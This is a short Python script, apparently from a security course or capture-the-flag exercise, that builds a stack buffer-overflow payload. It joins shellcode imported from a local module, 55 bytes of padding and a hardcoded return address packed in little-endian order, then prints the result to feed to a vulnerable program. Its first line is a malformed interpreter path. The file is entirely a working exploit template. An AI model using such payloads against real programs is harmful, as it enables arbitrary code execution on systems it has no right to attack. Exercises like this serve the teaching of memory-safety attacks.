#/user/bin/bash/python
from struct import pack
from shellcode import shellcode
address = pack("<I", 0xbffefa2c)
print(shellcode + "C"*55 + address)